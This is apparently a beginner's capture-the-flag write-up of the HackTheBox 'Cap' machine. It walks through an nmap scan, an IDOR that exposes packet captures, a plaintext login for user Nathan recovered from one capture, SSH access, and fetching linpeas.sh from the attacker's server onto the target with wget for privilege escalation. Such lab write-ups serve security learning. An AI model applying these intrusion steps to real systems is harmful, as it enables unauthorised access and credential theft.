# Cap

Hi:) this is my first write up and I decided to chose easy machine **Cap** from HTB.

## Enumeration

Just starting with Nmap:

```
nmap -sVC 10.10.10.245
```

![nmap](https://github.com/user-attachments/assets/428de170-61a9-4b2b-be77-85d76d020844)

Here we can see 3 tcp ports and on one of them there is FTP, in the future it may be useful. But now let’s check the website. Add this to hosts file (or the site will not work):

```
10.10.10.245 cap.htb
```

## Checking HTTP (port 80)

![site1](https://github.com/user-attachments/assets/2632adb9-433d-40ae-a186-bbc7a642a361)

Wow, it's logged as user. Here we can see different pages: _**IP config**_ shows output of the `ifconfig` command, _**Network status**_ the output of the `netstat`, but the "Security snapshot" caught my attention.

![image](https://github.com/user-attachments/assets/1ccaa9f8-46dd-47cf-a25e-2798dde41062)

When downloading, we get a **6.pcap** file, by opening it with **wireshark**, we can see the network data. If we try to re-visit this page, we will see a different value in the address bar, I have this value `7`. And if we try to change this value ourselves, there will be another file. Well, this is [IDOR](https://en.wikipedia.org/wiki/Insecure_direct_object_reference).

Deciding to check each **pcap** file, I tried the value `0`, and yes! This one is different from the others.

![image](https://github.com/user-attachments/assets/b54cf197-700e-45ba-8001-1e227f15069f)

After analyzing it a little, I saw these lines:

![image](https://github.com/user-attachments/assets/0477b462-75ea-48b0-af83-fa7082b9e875)

Here we see requests in which the user _**Nathan**_ logs in and is successful, which means we can use this data.

### What we have at the moment? 
- Login: Nathan
- Password: Buck3tH4TF0RM3!


We've found out the most important thing, so now we can move on to logging in and searching for the flag.

Now we log in with this data, I will use SSH because it is more convenient, but you can also use FTP.

```
ssh nathan@10.10.10.245
```

![image](https://github.com/user-attachments/assets/dd52c114-7a7b-49d7-82a7-d14918ec18ce)

And here is our user flag.

## Privilege Escalation

![image](https://github.com/user-attachments/assets/98284242-7e7e-4e65-9392-9d934aca2e50)

As we can see, our **Nathan** does not have the ability to use `sudo`, so we use `linpeas`.

Launching our server on Python:

```
sudo python3 -m http.server 9999
```
and with `wget` getting `linpeas`:

```
wget http://10.10.14.139:9999/linpeas.sh
```

![image](https://github.com/user-attachments/assets/4ec087bf-b0e1-48c1-a4e7-091e7055277c)

Launching linpeas:

```
nathan@10.10.10.245:~$ ./linpeas.sh
```
![image](https://github.com/user-attachments/assets/8367a5e4-c23a-4b19-9ccd-709f2034566d)

And that's the vulnerability, which means that with Python's help we can change Nathan's ID to Root's ID.

